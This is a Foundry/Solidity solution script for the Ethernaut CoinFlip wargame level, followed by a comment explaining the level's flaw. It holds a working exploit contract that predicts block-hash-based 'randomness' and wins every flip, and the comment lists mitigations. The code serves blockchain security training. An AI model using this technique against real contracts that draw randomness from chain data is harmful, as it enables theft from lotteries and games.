// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "ethernaut/levels/CoinFlip.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

/**
 * @title CoinFlipAttacker
 * @notice Contract that calculates and submits the correct guess in one transaction
 */
contract CoinFlipAttacker {
    // The same FACTOR value used in the CoinFlip contract
    uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(CoinFlip _coinFlipInstance) {
        // Calculate the correct guess using the same algorithm as the target contract
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        
        // Submit the flip in the same transaction, ensuring we use the same block hash
        _coinFlipInstance.flip(side);
    }
}

/**
 * @title CoinFlipSolver
 * @notice Script to solve the CoinFlip challenge
 * @dev Run with `forge script script/solutions/CoinFlipSolver.s.sol:CoinFlipSolver --rpc-url $RPC_URL --private-key $PRIVATE_KEY --broadcast`
 */
contract CoinFlipSolver is Script {
    // Instance address - replace with your own if needed
    CoinFlip public coinFlipInstance = CoinFlip(0x5ada4cf5fB4A67bDDB0a8707830CDc38181E1C66);

    function setUp() public {
        // No setup required
    }

    function run() public {
        // Get player address from private key
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        address player = vm.addr(privateKey);
        
        console.log("CoinFlip instance address:", address(coinFlipInstance));
        console.log("Player address:", player);
        
        // Check current consecutive wins before our attack
        uint256 currentWins = coinFlipInstance.consecutiveWins();
        console.log("Current consecutive wins:", currentWins);
        
        vm.startBroadcast(privateKey);

        // Step 1: Deploy attacker contract to calculate and submit the correct guess
        console.log("Step 1: Deploying attacker contract to execute the attack...");
        new CoinFlipAttacker(coinFlipInstance);
        
        // Step 2: Verify the result of our attack
        console.log("Step 2: Verifying attack result...");
        uint256 newWins = coinFlipInstance.consecutiveWins();
        console.log("New consecutive wins:", newWins);
        
        if (newWins > currentWins) {
            console.log("Attack successful! Win count increased.");
        } else {
            console.log("Attack failed. Win count did not increase.");
        }
        
        console.log("Remaining wins needed:", 10 - newWins);
        console.log("Note: Run this script multiple times (waiting for new blocks) until you reach 10 wins.");
        
        vm.stopBroadcast();
    }
}

/*
 * VULNERABILITY EXPLANATION
 * -----------------------
 * The CoinFlip contract attempts to create randomness by using the hash of the previous block,
 * but this information is publicly available on the blockchain:
 *
 * ```solidity
 * function flip(bool _guess) public returns (bool) {
 *     uint256 blockValue = uint256(blockhash(block.number - 1));
 *     
 *     if (lastHash == blockValue) {
 *         revert();
 *     }
 *     
 *     lastHash = blockValue;
 *     uint256 coinFlip = blockValue / FACTOR;
 *     bool side = coinFlip == 1 ? true : false;
 *     
 *     if (side == _guess) {
 *         consecutiveWins++;
 *         return true;
 *     } else {
 *         consecutiveWins = 0;
 *         return false;
 *     }
 * }
 * ```
 *
 * The contract uses a predictable source of randomness (previous block hash), allowing an
 * attacker to predict the outcome and always submit the correct guess.
 *
 * EXPLOIT TECHNIQUE
 * -----------------------
 * 1. Deploy a contract that calculates the coin flip result using the same algorithm
 * 2. Submit the correct guess in the same transaction
 * 3. Repeat for 10 consecutive blocks to complete the challenge
 *
 * The key insight is that both the calculation and submission must happen in the same transaction
 * to ensure they use the same block hash. This is why we use a separate contract whose constructor
 * does both operations atomically on-chain.
 *
 * SECURITY LESSONS
 * -----------------------
 * Blockchain data should never be used as a source of randomness in smart contracts, as it's
 * publicly visible and predictable. Block hashes, timestamps, and other on-chain data can all
 * be known or manipulated by attackers.
 *
 * For true randomness in smart contracts, use:
 * - Chainlink VRF (Verifiable Random Function)
 * - Commit-reveal schemes
 * - Multi-party computation
 * - Trusted oracles that provide external randomness
 *
 * Additionally, resetting critical counters on failure (like the win counter in this challenge)
 * can create exploitable patterns for attackers who can ensure they only submit successful
 * transactions.
 */ 